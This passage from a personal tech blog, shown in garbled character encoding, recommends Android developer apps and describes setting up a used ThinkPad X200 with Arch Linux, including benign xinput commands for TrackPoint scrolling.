ä¸ºå®˜æ–¹æ²¡æœ‰æ”¯æŒMiPadï¼Œåªæœ‰æ°‘é—´å¤§ç¥åˆ¶ä½œçš„å…¼å®¹åŒ…ï¼Œè¿˜åªæœ‰1.0ç‰ˆæœ¬çš„ï¼Œè™½ç„¶ç”¨ç€ä½“éªŒæŒºå¥½çš„ï¼Œæœ€åå®åœ¨æ¶ä¸ä½æŸäº›è›‹ç–¼çš„bugï¼Œè¿˜æ˜¯åˆ·å›äº†MIUIç³»ç»Ÿã€‚å…³äºRemixOSï¼Œå¦‚æœæœ‰æ„Ÿå…´è¶£çš„ï¼Œå¯ä»¥å»å®˜ç½‘ä¸‹è½½ä»–ä»¬çš„PCç‰ˆï¼Œå®‰è£…åˆ°uç›˜ä¸Šç›´æ¥æ’ç”µè„‘ä½“éªŒï¼Œä¸å»ºè®®åˆ·åˆ°å¤§å®¶çš„å¹³æ¿ä¸Šã€‚ ä¸ºäº†Rootï¼Œæ‰€ä»¥åˆ·äº†MIUIçš„å¼€å‘ç‰ˆæœ¬ï¼Œå·²å‡çº§åˆ°MIUI7(Android 4.4.4)ï¼Œåˆ é™¤äº†ç³»ç»Ÿçš„Updater.apkï¼Œç¦ç”¨äº†è‡ªåŠ¨æ›´æ–°ã€‚ 3. å¿…è£…åº”ç”¨åˆ—è¡¨ è°·æ­Œå®‰è£…å™¨ï¼ˆéœ€rootï¼‰ï¼šç»™å›½å†…è¢«é˜‰å‰²çš„å®‰å“ç³»ç»Ÿå®‰è£…â€œè°·æ­ŒæœåŠ¡æ¡†æ¶â€å’Œâ€œè°·æ­Œåº”ç”¨å¸‚åœºâ€ã€‚ ES File Explorerï¼šç¬”è€…åœ¨å®‰å“å¹³å°ä¸Šç”¨è¿‡çš„æœ€å¥½ç”¨çš„æ–‡ä»¶ç®¡ç†å™¨ï¼Œç»™å¼€å‘è€…æ¨èçš„åŸå› å¦‚ä¸‹ æ–¹ä¾¿ç®¡ç†å·²å®‰è£…åº”ç”¨ï¼Œè¿˜å¯ä»¥å¤‡ä»½åº”ç”¨ï¼ˆåŒ…æ‹¬åº”ç”¨æ•°æ®ï¼‰ æ”¯æŒftp/sftpï¼Œæ–¹ä¾¿è¿æ¥æœ¬åœ°å±€åŸŸç½‘çš„ç”µè„‘æˆ–äº‘ç«¯çš„Linuxä¸»æœºï¼Œè¿›è¡Œä¼ è¾“æ–‡ä»¶ã€‚ Root Explorerï¼ˆéœ€rootï¼‰ï¼šä¿—ç§°â€œREç®¡ç†å™¨â€ï¼Œå¯ä»¥ç›´æ¥å°†ç³»ç»Ÿè·¯å¾„æŒ‚è½½ä¸ºå¯å†™ï¼Œè¿˜å¯ä»¥åŸç”Ÿè¯»å–åº”ç”¨çš„dbæ–‡ä»¶ã€‚ AirDroidï¼šæ— çº¿ä¼ è¾“æ–‡ä»¶å’Œç®¡ç†å®‰å“è®¾å¤‡ã€‚ ä»ç”µè„‘ä¸ŠæŸ¥çœ‹å®‰å“è®¾å¤‡çš„å†…å®¹ï¼ˆç…§ç‰‡ã€æ”¶å‘çŸ­ä¿¡ç­‰ï¼‰ æŠŠç”µè„‘å½“åšå¹³æ¿çš„â€œé”®ç›˜â€ï¼Œå½“ç”µè„‘ä¸Šç‚¹ä¸­Airdroidçš„çª—å£åï¼Œç”µè„‘é”®ç›˜çš„è¾“å…¥éƒ½ä¼šåŒæ­¥åˆ°å¹³æ¿ä¸Šå»ã€‚ Hackerâ€™s Keyboardï¼šâ€œé»‘å®¢é”®ç›˜â€ï¼Œæ¨¡æ‹Ÿæ ‡å‡†çš„PCé”®ç›˜ï¼ŒåŒ…æ‹¬F1~F12ï¼Œctrlï¼Œaltï¼Œshiftï¼Œtabç­‰åŠŸèƒ½é”®ã€‚éå¸¸å®ç”¨ã€‚ Serverauditorï¼šSSHå®¢æˆ·ç«¯ï¼Œé…è‰²éå¸¸å°æ¸…æ–°ï¼Œè€Œä¸”è·¨å¹³å°ï¼Œåœ¨iOSå’Œchromeä¸Šéƒ½æœ‰ã€‚è¿˜èƒ½è‡ªåŠ¨åˆ¤åˆ«æ‰€è¿æ¥çš„ä¸»æœºæ˜¯ä»€ä¹ˆç³»ç»Ÿå¹¶ä¸”ç»™ç›¸åº”çš„ä¸»æœºåŠ ä¸Šå¯¹åº”ç³»ç»Ÿçš„Logoã€‚ ConnectBotï¼šä¹Ÿæ˜¯ä¸€æ¬¾SSHå®¢æˆ·ç«¯ï¼Œå®˜æ–¹Githubçš„ä»‹ç»ä¸ºâ€œConnectBot is the first SSH client for Androidâ€ã€‚åŠŸèƒ½æ¯”Serverauditorå¼ºå¤§ï¼Œè€Œä¸”Hackerâ€™s Keyboardä¸“é—¨ä¸ºå…¶åšäº†ä¼˜åŒ–ï¼ˆè¯¦è§Hackerâ€™s Keyboardçš„è®¾ç½®é¡µï¼‰ã€‚ IrssiConnectBotï¼šä»¥ConnectBotä¸ºåŸå‹çš„SSHå®¢æˆ·ç«¯ï¼Œå¢åŠ äº†moshåè®®ã€‚åˆ‡è®°ï¼Œåƒä¸‡ä¸è¦å»GooglePlayå•†åº—å®‰è£…ï¼Œé‚£é‡Œä¸‹è½½çš„ç‰ˆæœ¬å’Œæœ€åŸºç¡€çš„ConnectBotä¸€æ¯›ä¸€æ ·ï¼Œæ ¹æœ¬å°±æ²¡æœ‰moshï¼è¯·åˆ°IrssiConnectBotçš„å®˜ç½‘ä¸‹è½½æˆ–è€…ç‚¹å‡»æ­¤å¤„ä¸‹è½½æˆ–è€…å»å®ƒçš„Githubä¸‹è½½æºç åˆ°æœ¬åœ°è‡ªå·±ç¼–è¯‘ã€‚ JuiceSSHï¼šçœ‹åç§°å°±çŸ¥é“å®ƒä¹Ÿæ˜¯ä¸€æ¬¾SSHå®¢æˆ·ç«¯äº†ï¼ŒåŒæ ·æ”¯æŒmoshåè®®ï¼Œè€Œä¸”æ˜¯moshå®˜ç½‘æ¨èçš„moshå®¢æˆ·ç«¯ã€‚åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œè¿˜æ”¯æŒæ’ä»¶ã€‚ä½†æ˜¯ï¼ç¬”è€…ä¸å–œæ¬¢JuiceSSHï¼Œå› ä¸ºç¬”è€…è¿œç¨‹ç®¡ç†ä¸»æœºä¸€èˆ¬éƒ½ä¼šä½¿ç”¨åˆ°Tmuxï¼Œéœ€è¦æŒ‰ç¼€é”®Ctrl-Bæ¥æ¿€æ´»ï¼Œä½†æ˜¯JuiceSSHä¸è¯†åˆ«åŒæ—¶æŒ‰ä¸‹çš„Ctrlé”®å’ŒBé”®ï¼Œæ•…æŠ›å¼ƒã€‚ä½†ä¸å¦¨ç¢å®ƒæˆä¸ºGooglePlayä¸Šæœ€ç•…é”€çš„SSHå®¢æˆ·ç«¯ä¹‹ä¸€ã€‚ Shadowsocksï¼šä¸è§£é‡Šï¼Œæ‡‚å¾—äººè‡ªç„¶æ‡‚ï¼Œä¸æ‡‚çš„äººï¼Œæœ‰â€œç—…â€çš„è¯æœç´¢ä¸€ä¸‹ï¼ˆå“ˆå“ˆå“ˆï¼Œå…¶å®æ˜¯bing.comï¼‰ï¼Œç™¾åº¦è¯¥è¯å·²è¢«å’Œè°ã€‚å½“ç„¶å»ºè®®ä»GooglePlayä¸Šå®‰è£…ã€‚ BusyBoxï¼ˆéœ€rootï¼‰ï¼šBusyBox è¢«ç§°ä¸º Linux å·¥å…·é‡Œçš„ç‘å£«å†›åˆ€.ç®€å•çš„è¯´BusyBoxå°±å¥½åƒæ˜¯ä¸ªå¤§å·¥å…·ç®±ï¼Œå®ƒé›†æˆå‹ç¼©äº† Linux çš„è®¸å¤šå·¥å…·å’Œå‘½ä»¤ã€‚Androidçš„æœ¬è´¨æ˜¯Linuxï¼Œä½†å…¶åº•å±‚çš„ä¸€äº›å·¥å…·ä¸ä»…è¾ƒæ ‡å‡†çš„Linuxå°‘å¾ˆå¤šï¼Œå·²æœ‰çš„å‡ ä¹ä¹Ÿæ˜¯åŠŸèƒ½ä¸å®Œå–„çš„ã€‚BusyBoxçš„ä½œç”¨å°±æ˜¯è¡¥å…¨å’Œæ›¿æ¢æ‰è¿™äº›Linuxå·¥å…·ã€‚ Linux Deployï¼ˆéœ€rootå’Œå®‰è£…BusyBoxï¼‰ï¼šæœ€åç¥­ä¸Šçš„ç»ˆææ€å™¨ï¼Œå®˜æ–¹Githubã€‚ç®€å•ä¸€å¥è¯ä»‹ç»â€“â€œåœ¨ä½ çš„å®‰å“è®¾å¤‡ä¸ŠåŸç”Ÿè·‘Linuxâ€ã€‚åŸºæœ¬åŸç†â€“â€œchrootâ€ï¼Œæƒ³è¯¦ç»†äº†è§£çš„å¯ä»¥ä»è¿™ä¸ªå…³é”®è¯å…¥æ‰‹ã€‚å¯ä»¥é€‰æ‹©çš„Linuxå‘è¡Œç‰ˆæœ‰å¾ˆå¤šï¼Œä¸»æµçš„éƒ½æœ‰ï¼ŒåŒ…æ‹¬Debianã€Ubuntuã€CentOSã€Arch Linuxã€Gentooç­‰ç­‰ï¼Œå®‰è£…å®Œæˆåå¯ä»¥é€šè¿‡127.0.0.1:22è¿›è¡ŒSSHç™»å…¥ã€‚å¦‚æœå¹³æ¿çš„ç©ºé—´è¶³å¤Ÿçš„è¯ï¼Œå¯ä»¥åŒæ—¶å®‰è£…å¾ˆå¤šä¸ª(å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç¬”è€…å®‰è£…äº†Arch Linuxã€Ubuntuå’ŒGentoo)ï¼Œä½†åªèƒ½åŒæ—¶é€‰æ‹©ä¸€ä¸ªè¿è¡Œã€‚ GMD GestureControl Liteï¼ˆéœ€rootï¼‰ï¼šæœ€åçš„æœ€åï¼Œé€ä¸Šçš„ä¸€æšæ‰‹åŠ¿è½¯ä»¶ï¼ˆå¹¶éåªä¸ºå¼€å‘è€…æ¨èå“¦ï¼‰ã€‚è¿™è¾¹ç»™å‡ºçš„é“¾æ¥æ˜¯Liteç‰ˆï¼ˆéLiteç‰ˆè¦ä»·5.55ç¾å…ƒï¼‰ï¼Œä½†æ˜¯Liteç‰ˆå°±å¤Ÿç”¨äº†ã€‚ç¾¡æ…•iPadçš„å„ç§æ‰‹åŠ¿å—ï¼Ÿå››æŒ‡å†…æŠ“é€€å›æ¡Œé¢ã€å››æŒ‡å·¦å³æ¨ªæ‰«åˆ‡æ¢ä¸Šä¸€ä¸ªåº”ç”¨å’Œä¸‹ä¸€ä¸ªåº”ç”¨ã€å››æŒ‡ä¸Šæ¨æ˜¾ç¤ºæœ€è¿‘åº”ç”¨åˆ—è¡¨ã€‚ã€‚ã€‚æœ‰äº†è¿™ä¸ªè½¯ä»¶ï¼Œè¿™äº›åŠŸèƒ½ä½ éƒ½èƒ½å®ç°ï¼è€Œä¸”å®ç°çš„æ›´å¤šï¼ç®€ç›´å ªæ¯”iOSçš„è¶Šç‹±æ’ä»¶Activatorï¼ 4. ç»“è¯­å…¶å®è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šå…¶ä»–ä¸ºå¼€å‘è€…å‡†å¤‡çš„è½¯ä»¶ï¼Œå¦‚æœæœ‰è¯»è€…æ„¿æ„æ¨èçš„è¯ï¼Œè¯·åœ¨ä¸‹é¢ç»™æˆ‘ç•™è¨€å•¦ï¼Œå°å¼Ÿä¸èƒœæ„Ÿæ¿€ï¼æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Utility","slug":"Utility","permalink":"https://blog.chaosjohn.com/tags/Utility/"},{"name":"Android","slug":"Android","permalink":"https://blog.chaosjohn.com/tags/Android/"},{"name":"Developer","slug":"Developer","permalink":"https://blog.chaosjohn.com/tags/Developer/"}]},{"title":"åªä¸ºä½“éªŒå°çº¢ç‚¹--æˆ‘çš„â€œThinkPad X200â€","slug":"My-ThinkPad-X200","date":"2016-05-28T08:50:50.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"My-ThinkPad-X200.html","link":"","permalink":"https://blog.chaosjohn.com/My-ThinkPad-X200.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ 1. æ‰‹è´±å…¥å‘X200 ä¹‹å‰é€›çŸ¥ä¹é€›è®ºå›ï¼Œç»å¸¸çœ‹åˆ°æœ‰ä¸¤æ‹¨äººæ‰“å£æ°´ä»—ï¼Œéå¾—å°±â€œMacBookçš„è§¦æ§æ¿å’ŒThinkpadçš„å°çº¢ç‚¹å“ªä¸€ä¸ªå¥½ç”¨â€äº‰ä¸ªè„¸çº¢è€³èµ¤ã€‚ï¼ˆå‰è€…ä¸ºTrackPadï¼Œåè€…ä¸ºTrackPointï¼‰ ä½œä¸ºä¸€ä¸ªå·²ç»ç”¨äº†å››äº”å¹´MacBookçš„æœç²‰ï¼Œç¬”è€…ä¹‹å‰ä¸€ç›´è§‰å¾—TrackPadæ˜¯å²ä¸Šæœ€å¥½ç”¨çš„ç”µè„‘è¾“å…¥è®¾å¤‡ã€‚ä»¥è‡³äºç¬”è€…ä¸€ç›´æ˜¯TrackPadçš„é‡åº¦ä½¿ç”¨è€…ï¼Œç”µè„‘åŒ…é‡Œåªæœ‰MacBookè€Œä»æ¥ä¸æºå¸¦é¼ æ ‡ï¼Œä¹Ÿä»æ¥æ²¡æœ‰ä½¿ç”¨é¼ æ ‡çš„ä¹ æƒ¯ã€‚ï¼ˆPSï¼šç¬”è€…æ˜¯ä¸€åªéå¸¸ç¨€å°‘çš„ä¸æ‰“æ¸¸æˆçš„é›„æ€§ç¨‹åºçŒ¿ï¼‰ çœ‹å¤šäº†â€œTrackPad Vs. TrackPointâ€œä¹‹äº‰ï¼Œè‡ªç„¶å¿ƒé‡Œç—’ç—’çš„ã€‚å’‹åŠå“©ï¼Ÿé‚£å°±ä¹°ä¸€å°ä½“éªŒä½“éªŒï¼å¯æ˜¯ThinkPadè¿˜æŒºè´µçš„ï¼Œä¹°ä¸€å°å¤§å‡ åƒå‘¢ï¼Œç¬”è€…å¯æ˜¯å‹¤ä¿­æŒå®¶çš„å¥½ç”·äººï¼Œè€å©†æœ¬å¯ä¸èƒ½éšä¾¿åŠ¨ã€‚ã€‚ã€‚äºæ˜¯é»˜é»˜åœ°æå‡ºçˆªæœºåˆ·èµ·äº†é—²é±¼(ğŸ™ˆæ‚è„¸é€ƒ) é€‰æœºä¸Šï¼Œç¬”è€…çœ‹ä¸­äº†ThinkPad X200ï¼Œç»å…¸çš„å°é»‘ï¼Œç™¾åº¦ç™¾ç§‘é“¾æ¥ Intel(R) Core(TM)2 Duo CPU â€“ è‡³å°‘ä¸æ˜¯èµ›æ‰¬å¥”è…¾ä¹‹ç±»çš„å¤„ç†å™¨ Intel GMA X4500æ˜¾å¡ â€“ éƒ½è¯´äº†ç¬”è€…ä¸æ‰“æ¸¸æˆäº†ï¼Œè¦ç‹¬æ˜¾å¹²å˜›ï¼Œæµªè´¹é’±ï¼Ÿ DDR3 â€“ è¿˜å¥½ä¸æ˜¯DDR2ï¼Œä¸ç„¶å‡çº§ä½ç‰ˆæœ¬çš„å†…å­˜å¾—æ­»è´µæ­»è´µçš„ï¼Œè¿˜è®°å¾—ä¹‹å‰æœ‰ä¹°è¿‡ä¸€æ ¹DDR333çš„1Gå†…å­˜éƒ½èŠ±äº†ä¸¤ç™¾å·¦å³ åªæœ‰TrackPointï¼Œæ²¡æœ‰è§¦æ‘¸æ¿ â€“ è¦æ˜¯æœ‰è§¦æ‘¸æ¿çš„è¯ï¼Œæˆ‘æ€•è‡ªå·±ä¼šä¸‹æ„è¯†çš„ç”¨å®ƒï¼Œé‚£ç®—å“ªé—¨å­çš„ä½“éªŒå°çº¢ç‚¹å‘€ é—²é±¼ä¸Šçš„X200å¤§å¤šåœ¨600å—é’±å·¦å³ï¼Œå¦‚æœé…å¤‡SSDï¼Œä»·æ ¼å·®ä¸å¤šéƒ½é£™åˆ°å…«ä¹ç™¾ï¼Œä¸€åƒå¤šçš„ä¹Ÿæœ‰å¾ˆå¤šã€‚ç¬”è€…çš„ä»·æ ¼åº•çº¿æ˜¯500ï¼Œå”‰ï¼Œæ€ä¹ˆé‚£ä¹ˆç©·ï¼ X200åœ¨ç¬”è€…çš„â€œæ¬²è´­æ¸…å•â€ä¸Šå¾…äº†å¤§åŠå¹´ï¼Œæ—¶ä¸æ—¶åœ°å°±æ¥é—²é±¼çœ‹çœ‹æœ‰æ²¡æœ‰åˆé€‚çš„(ä½©æœè‡ªå·±çš„è€å¿ƒ)ã€‚ç»ˆäºåœ¨ä¸‰å‘¨å‰ï¼Œè”ç³»åˆ°äº†ä¸€ä½å–å®¶ï¼Œä¸ä»–å•†è®®ä¸è¦å†…å­˜ä¸è¦ç¡¬ç›˜ï¼ˆç¬”è€…æœ‰é—²ç½®çš„å†…å­˜æ¡å’Œç¡¬ç›˜ï¼‰ï¼Œäºæ˜¯ä»¥290çš„ä»·æ ¼æˆäº¤ï¼ˆåŒ…é‚®ï¼‰ã€‚å“‡å’”å’”ï¼ ä¸€å‘¨æ˜ŸæœŸçš„ç„¦æ€¥ç­‰å¾…åï¼Œç›¼æ¥äº†X200ã€‚æ‹†æœºï¼ŒåŒ…çš„è¿˜æŒºä¸¥å®ï¼Œæ‰“å¼€ï¼ŒæŒ‰ä¸‹ç”µæºé”®ï¼Œè¿˜æœ‰ç”µï¼Œå…³æœºã€‚æ‰“å¼€åç›–ï¼Œæœ‰ä¸¤ä¸ªå†…å­˜æ’æ§½ï¼Œéšä¾¿æ’ä¸Šä¸€æ ¹4Gçš„å†…å­˜ï¼Œå†æ¬¡å¼€æœºï¼Œå±…ç„¶æç¤ºå†…å­˜é”™è¯¯ã€‚åŸæ¥ä¸¤ä¸ªå†…å­˜æ’æ§½è¿˜åˆ†0å·å’Œ1å·ï¼Œå¿…é¡»ä»0å·å¼€å§‹ä½¿ç”¨èµ·ã€‚æ™•æ­»ï¼Œæ¢äº†ä¸ªå†…å­˜æ’æ§½ï¼Œæœç„¶æ²¡é—®é¢˜äº†ã€‚å†æ¢æˆä¸¤æ ¹2Gçš„ï¼Œä¹Ÿæ²¡é—®é¢˜ã€‚ç©è¿‡è¿™ä¹ˆå¤šç”µè„‘ï¼Œè¿˜æ˜¯ç¬¬ä¸€æ¬¡è§åˆ°è¿™ç§çŠ¶å†µã€‚éšä¾¿æ‰¾ä¸ªäº†è£…äº†Linux Liveçš„uç›˜ï¼Œèƒ½æ­£å¸¸è¿›å…¥ç³»ç»Ÿï¼Œè“ç‰™Wifiå·¥ä½œéƒ½æ­£å¸¸ã€‚ 2. X200åˆä½“éªŒ å…ˆè¯´è¯´ç¼ºç‚¹ æœ‰ä¸¤ä¸ªæŒ‰é”®å¤ªçµæ•ï¼ŒXå’ŒKï¼Œè½»è½»ç¢°ä¸Šå»éƒ½ä¼šæ‰“å‡ºxå’Œkçš„å­—æ¯ã€‚Xé”®å¤ªçµæ•èƒ½å¿ï¼Œä½†æ˜¯ä½œä¸ºVIMå…šï¼ŒKé”®å¤ªçµæ•å°±ä¸èƒ½å¿ï¼æ‰£ä¸‹é”®å¸½ï¼Œç”¨ç¼è¡£é’ˆæŠŠé‡Œé¢çš„è„ä¸œè¥¿æŒ‘å‡ºæ¥ï¼Œå¹é£æœºå¹å¹ï¼ŒæŒ‰å›å»ï¼Œå±…ç„¶å¥½äº†ï¼äºæ˜¯ï¼Œæ­¤ç¼ºç‚¹ä»æ­¤æ¶ˆå¤±ã€‚ åº•éƒ¨é è¿‘ç”µæºçš„ä¸€ä¸ªé˜²æ»‘æ©¡èƒ¶è„šå«æ‰äº†ï¼Œç”µè„‘æ”¾åœ¨æ¡Œå­ä¸Šä¼šä¸ç¨³ï¼Œç»å¸¸ä¼šæœ‰â€œå¡æ‹‰å¡æ‹‰â€å’Œæ¡Œé¢è½»ç¢°çš„å£°éŸ³ã€‚äºæ˜¯ä¸ŠæŸå®èŠ±äº†å‡ å—é’±ä¹°äº†ä¸ªç›¸åŒå‹å·çš„è„šå«ã€‚è¯¥ç¼ºç‚¹ä¹Ÿä»æ­¤æ¶ˆå¤±ã€‚ ç”µæ± æ˜¯6èŠ¯çš„ï¼Œè®¾è®¡å®¹é‡1723mAhï¼Œå‰©ä½™å®¹é‡1470mAhï¼Œä»…ä¸ºåŸæ¥çš„85%ï¼Œç»­èˆªåªèƒ½æ’‘2ä¸ªå°æ—¶ä¸åˆ°ã€‚è¿™ä¸ªç¼ºç‚¹ç­‰ä»¥åçœŸæ­£æœ‰ç»­èˆªéœ€æ±‚çš„æ—¶å€™å†è€ƒè™‘è§£å†³å§ï¼Œä¹°ä¸ª9èŠ¯çš„ç”µæ± ä¹Ÿå°±ä¸€ä¸¤ç™¾å—é’±ã€‚ æ‰¾ä¸åˆ°å…¶ä»–ç¼ºç‚¹äº†ğŸ˜€ ä»¥ä¸‹å¼€å§‹è¿›å…¥â€œæ‹é©¬å±æ¨¡å¼â€ æˆè‰²éå¸¸å¥½ï¼ˆè§å°é¢å›¾ï¼‰ï¼Œé”®ç›˜å®Œå…¨æ²¡æœ‰æ²¹å…‰ï¼Œç”¨é…’ç²¾æŠŠæ•´æœºæ“¦æ‹­äº†ä¸€éåï¼Œä¿å®ˆä¼°è®¡95æ–°å§ï¼Œå™¢è€¶èµšåˆ°äº†ï¼Œé—²é±¼ä¸Šå¾ˆå¤šå–çš„å¾ˆè´µçš„ï¼Œçœ‹æˆè‰²éƒ½å¾ˆæ—§å¾ˆè„ã€‚ é‡é‡å¾ˆè½»ï¼Œ1.394KGï¼Œç¬”è€…çš„MacBook Airé‡é‡ä¹Ÿè¾¾åˆ°äº†1.35KGï¼Œåªå·®44gï¼ˆè„‘æµ·é‡Œè«ååœ°æƒ³èµ·åˆä¸­ç‰©ç†è¯¾æœ¬ï¼Œä¸€ä¸ªé¸¡è›‹50gï¼‰ ç¬”è€…ä¹°çš„è¿™å°X200æ˜¯P8600çš„CPUï¼Œæ€§èƒ½æ¯”æœ€æ—©çš„i3éƒ½è¦å¼ºã€‚ã€‚ã€‚ç¬”è€…æœ€æ—©çš„ä¸€å°MacBookæ˜¯ç»å…¸æ¬¾çš„â€œå°ç™½â€MC207ï¼ŒP7550çš„CPUï¼Œç”¨åˆ°ç°åœ¨ä¸ºæ­¢éƒ½ä¾ç„¶â€œåšæŒºâ€ï¼ é”®ç›˜æ‰‹æ„Ÿå¾ˆå¥½ï¼Œæ¯”Macçš„åŸè£…é”®ç›˜è¦å¥½ï¼Œé”®ç¨‹é€‚ä¸­ï¼Œå¼¹æ€§ä¸é”™ï¼Œæ‰‹æ„Ÿåè½¯ã€‚ æ•£çƒ­çœŸèµï¼å‘çƒ­çœŸå°ï¼ç”µè„‘å¼€ä¸€æ•´å¤©ï¼ŒCé¢(æœ‰é”®ç›˜çš„é‚£ä¸€é¢)æ²¡æœ‰ä¸æ¯«çƒ­æ„Ÿï¼ŒDé¢(ç”µè„‘åº•éƒ¨)æ„Ÿè§‰å’Œäººçš„ä½“æ¸©å·®ä¸å¤šï¼Œå‡ºé£å£å‡ ä¹æ²¡æœ‰å¾ˆå¤§çš„é£å¹å‡ºæ¥ï¼Œå¯¼è‡´æ•´æœºéå¸¸é™éŸ³ï¼Œä¸æ¯«æ²¡æœ‰å…¶ä»–ç”µè„‘é£æ‰‡ä¸ºäº†æ•£çƒ­ç‹‚è½¬é€ æˆçš„å™ªéŸ³ã€‚ Wifiå±…ç„¶æ”¯æŒ2.4GHzå’Œ5GHzåŒé¢‘æ®µï¼ï¼ï¼å¤©å“ªï¼Œ08å¹´çš„ç”µè„‘å•Šï¼ï¼ï¼ 3. ä½“éªŒå°çº¢ç‚¹ å…¶å®è¯´æ˜¯è¯´å°çº¢ç‚¹ï¼Œä½†ä¸ä»…ä»…æ˜¯åœ¨æŒ‰é”®â€œBâ€ä¸Šæ–¹çš„çº¢è‰²çš„æ©¡èƒ¶ç‚¹ï¼Œè¿˜åŒ…æ‹¬äº†ç©ºæ ¼ä¸‹æ–¹çš„ä¸‰ä¸ªæŒ‰é”®ï¼Œä»å·¦å¾€å³åˆ†åˆ«å¯¹åº”é¼ æ ‡çš„å·¦é”®ã€ä¸­é”®å’Œå³é”®ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æŒ‰ä½å°çº¢ç‚¹ï¼Œæ‰‹æŒ‡å¾€å“ªè¾¹ç”¨åŠ›ï¼Œå…‰æ ‡å°±ä¼šå¾€å“ªè¾¹ç§»åŠ¨ã€‚ä¸€å¼€å§‹çœŸçš„å¾ˆéš¾æŠŠæ¡ç§»åŠ¨çš„è§’åº¦å’Œé€Ÿåº¦ï¼Œæ€»æ˜¯å¾ˆéš¾éå¸¸å¿«é€Ÿåœ°æŠŠå…‰æ ‡ç§»åŠ¨åˆ°ç›®æ ‡ä½ç½®ï¼Œç”¨åŠ›å°äº†ï¼Œç§»åŠ¨åœ°å¤ªæ…¢ï¼Œç”¨åŠ›å¤§äº†ï¼Œä¸€ä¸‹å­å°±ç§»åŠ¨è¿‡å¤´äº†ã€‚è¿˜å¥½æ²¡æœ‰ä¹°å¸¦è§¦æ‘¸æ¿çš„å‹å·ï¼Œå¼ºè¿«è‡ªå·±ä½¿ç”¨å°çº¢ç‚¹åŠå¤©ä¸åˆ°ï¼Œå°±å·®ä¸å¤šèƒ½é¡ºç•…ä½¿ç”¨å®ƒäº†ã€‚ å·¦é”®å’Œå³é”®çš„åŠŸèƒ½å°±ä¸è¯´äº†ï¼Œå¦‚æœåœ¨æµè§ˆç½‘é¡µæˆ–æ–‡æ¡£æ—¶ï¼ŒæŒ‰ä½ä¸­é”®åå†ç»™å°çº¢ç‚¹ç”¨åŠ›ï¼Œå°±èƒ½æ»šå±å•¦ã€‚â€œå“—å“—å“—â€éå¸¸é¡ºç•…ï¼Œä¸ªäººæ„Ÿè§‰æ¯”é¼ æ ‡æ»šè½®è¦å¥½ç”¨å¾—å¤šï¼Œç®€ç›´èƒ½åª²ç¾MacBookè§¦æ§æ¿çš„åŒæŒ‡æ»šå±ï¼Œå¾ˆæ˜¯å–œæ¬¢ï¼ å› ä¸ºå°šæœªåœ¨X200ä¸Šå®‰è£…è¿‡Windowsï¼Œæ‰€ä»¥å…³äºå°çº¢ç‚¹åœ¨Windowsä¸‹çš„è¡¨ç°ç¬”è€…ä¸è¿›è¡Œæè¿°ï¼Œä¸€èˆ¬è¦å»ThinkPadå®˜ç½‘ä¸‹è½½ç›¸å…³é©±åŠ¨ä»¥å¯åŠ¨ã€‚ å› ä¸ºå¿«é€’åˆšæ”¶åˆ°çš„æ—¶å€™ï¼Œç¬”è€…ä¸ºäº†æµ‹æ•´æœºè´¨é‡ï¼Œæ‰€ä»¥å°±ç”¨äº†ä¸€å—Linux LiveUSBè¿›è¡Œå¯åŠ¨ï¼Œæ“ä½œç³»ç»Ÿä¸ºæœ€æ–°çš„Ubuntu 16.04ï¼Œå†…ç½®äº†TrackPointçš„é©±åŠ¨ï¼Œå°çº¢ç‚¹çš„æ‰€æœ‰åŠŸèƒ½éƒ½èƒ½æ­£å¸¸ä½¿ç”¨ã€‚æ‰€ä»¥è¯»è€…å¦‚æœå®‰è£…Ubuntuç³»åˆ—çš„æ“ä½œç³»ç»Ÿçš„è¯ï¼Œæ˜¯ä¸ç”¨è´¹å¿ƒå†å®‰è£…ç›¸å…³é©±åŠ¨çš„ï¼Œå¼€ç®±å³ç”¨ã€‚ ç¬”è€…æ”¶åˆ°å¿«é€’å½“å¤©å°±åœ¨æŸä¸œä¹°äº†å—120GBçš„SSDï¼Œäºæ˜¯å°±åœ¨è¿™å—ç¡¬ç›˜ä¸Šå®‰è£…äº†Arch Linuxã€‚ Arch Linuxçš„å®‰è£…ä¸å†èµ˜è¿°ï¼Œç›´æ¥å‚ç…§Arch Wikiçš„æ–°æ‰‹æ•™ç¨‹å³å¯ï¼Œä»¥åæœ‰æœºä¼šæˆ‘ä¼šå†™ç¯‡æ¯”è¾ƒæµ…æ˜¾æ˜“æ‡‚çš„æ–‡ç« ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå°çº¢ç‚¹åœ¨Arch Linuxä¸‹åªèƒ½ç”¨ä½œç§»åŠ¨å…‰æ ‡ï¼Œè€Œä¸èƒ½ç”¨æ¥æ»šåŠ¨å±å¹•ã€‚çœŸæ˜¯æ„æ­»äº†ï¼ŒåºŸäº†å¥½å¤§åŠ²å®‰è£…äº†Arch Linuxï¼Œç»“æœå´ä¸èƒ½å®Œå…¨å‘æŒ¥å°çº¢ç‚¹çš„å¨åŠ›ã€‚ åœ¨Googleä¸Šæœç´¢äº†ä¸€ç•ªï¼Œç»ˆäºæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆï¼Œåœ¨å‘½ä»¤è¡Œä¸‹è¾“å…¥ä»¥ä¸‹å¼€å¯å‚ç›´æ»šåŠ¨ 123456789 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation&quot; 1 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Button&quot; 2 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Timeout&quot; 200 ``` * å¦‚æœè¿˜æƒ³å¼€å¯æ°´å¹³æ»šåŠ¨çš„è¯ï¼Œæ‰§è¡Œ ```bash xinput set-prop 